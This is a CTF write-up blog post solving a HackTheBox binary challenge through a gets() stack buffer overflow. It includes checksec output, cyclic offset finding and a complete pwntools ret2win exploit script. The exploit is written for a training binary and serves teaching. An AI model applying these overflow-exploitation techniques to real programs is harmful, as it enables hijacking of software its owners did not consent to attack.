---
layout: post
title: "Jumpio Adventure CTF Writeup"
date: 2025-07-26 01:18:00 +0300
categories: [HackTheBox, CTFs]
tags: [cybersecurity, reverse, hackthebox, prolabs, stacksmash]
---

# 🎰 Jumpio-Adventure CTF Writeup

In this writeup, I’ll walk you through how I solved the **Jumpio-Adventure** CTF binary challenge. This challenge is great for practicing **pwntools** and classic buffer overflow techniques. Let’s jump in!

---

## 📂 Inspecting the Zip File

The provided zip archive contains two files:

- `jumpios_adventure`: The main binary
- `flag`: A decoy file (not the real flag)

---

## 🧠 Initial Analysis

The binary is quite small, so I initially tried uploading it to [dogbolt](https://dogbolt.org) for a quick disassembly. However, I found that **Ghidra** provided a more readable decompilation and analysis experience.

---

## ⚠️ The Danger of `gets()`

Upon analyzing the binary, I noticed it uses the `gets()` function to read user input. This function is inherently unsafe because it doesn’t check for buffer boundaries, making the binary **vulnerable to buffer overflow** attacks. This is our potential attack vector.

---

## 🔐 Security Features Check

Next, we run `checksec` to understand the binary's memory protection features:

```sh
┌──(marius㉿marius)-[~/Desktop]
└─$ pwn checksec jumpios_adventure 
[*] '/home/marius/Desktop/jumpios_adventure'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
````

### Key Takeaways:

* ✅ **No stack canary**: Makes stack smashing possible.
* ✅ **No PIE**: Function addresses are static → easier exploitation.
* ✅ **NX enabled**: We can’t execute shellcode on the stack → but we can jump to existing functions like `win()`.
* ✅ **Not stripped**: Function symbols are available → makes identifying functions easier.

---

## 🎯 Finding the Target: `win()` Function

We search for the `win()` function in the symbol table:

```sh
┌──(marius㉿marius)-[~/Desktop]
└─$ nm jumpios_adventure | grep " win"
000000000040154f T win
```

The `win()` function is located at address `0x40154f`. Based on analysis, calling this function will print the flag using `cat flag.txt`.

<pre>Although we’re referencing C code examples, you can identify similar patterns at the assembly level.</pre>

---

## 🎮 Understanding the Game Logic

When you run the binary, it starts a fight-style game. You begin with 10 damage points, and you can **drink potions** to increase your attack power. Once you defeat the enemy, you’re prompted to **enter your name**—this is where the vulnerable `gets()` is triggered.

### Exploitation Plan:

1. Start the fight.
2. Drink 5 potions to increase attack power.
3. Attack once (enemy dies).
4. When asked to enter your name, provide a crafted payload that overflows the buffer and jumps to `win()`.

---

## 🔍 Finding the Overflow Offset

We use `cyclic` patterns to find the exact point where our input overwrites the return address:

```sh
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa...
pwndbg> run
```

Once the program crashes, we identify the offset:

```bash
pwndbg> python -c "from pwn import *; print(cyclic_find('kaaa'))"
88
```

This tells us the return address is overwritten after 88 bytes of input. Perfect!

---

## 🧪 Final Exploit using Pwntools

Now that we have the offset and the target function address, we can craft our exploit:

```python
from pwn import *
import time

e = ELF('./jumpios_adventure')
r = remote("HOST", PORT)  # Replace with actual host and port

payload = b"A" * 88 + p64(e.sym.win)  # 88-byte padding + address of win()

# Navigating the game menu
r.sendlineafter(b'> ', b'1')  # Start Fight
for _ in range(5):
    r.sendlineafter(b'> ', b'4')  # Drink Potion
r.sendlineafter(b'> ', b'5')      # Show Options
r.sendlineafter(b'> ', b'1')      # Attack (Punch)

# Trigger the vulnerable input
r.sendlineafter(b'name: ', payload)

# Switch to interactive mode to catch the flag output
r.interactive()
```

---

## 🏁 Conclusion

Through this challenge, we practiced:

* Identifying unsafe functions (`gets`)
* Using `checksec` to evaluate binary protections
* Finding buffer overflow offsets with cyclic patterns
* Writing a working exploit using pwntools
* Hijacking program execution flow to trigger a hidden flag-revealing function

This kind of binary is perfect for beginners looking to understand real-world exploitation concepts in a CTF setting. Thanks for reading, and see you in the next writeup!

---

